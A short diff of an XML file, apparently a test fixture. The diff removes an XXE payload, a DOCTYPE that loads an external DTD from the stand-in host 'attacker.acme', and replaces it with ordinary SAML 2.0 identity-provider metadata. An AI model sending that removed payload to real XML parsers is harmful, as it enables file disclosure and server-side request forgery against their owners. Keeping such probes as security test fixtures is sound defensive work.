@@ -1,3 +1,24 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.acme/test.dtd"> %xxe;]>
-<foo>bar</foo>
+
+<EntityDescriptor entityID="https://example.com/idp"
+                  xmlns="urn:oasis:names:tc:SAML:2.0:metadata">
+
+    <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
+
+        <KeyDescriptor use="signing">
+            <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
+                <X509Data>
+                    <X509Certificate>
+                        MIIDdzCCAl+gAwIBAgIEbW...
+                    </X509Certificate>
+                </X509Data>
+            </KeyInfo>
+        </KeyDescriptor>
+
+        <SingleSignOnService
+            Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
+            Location="https://example.com/sso"/>
+
+    </IDPSSODescriptor>
+
+</EntityDescriptor>
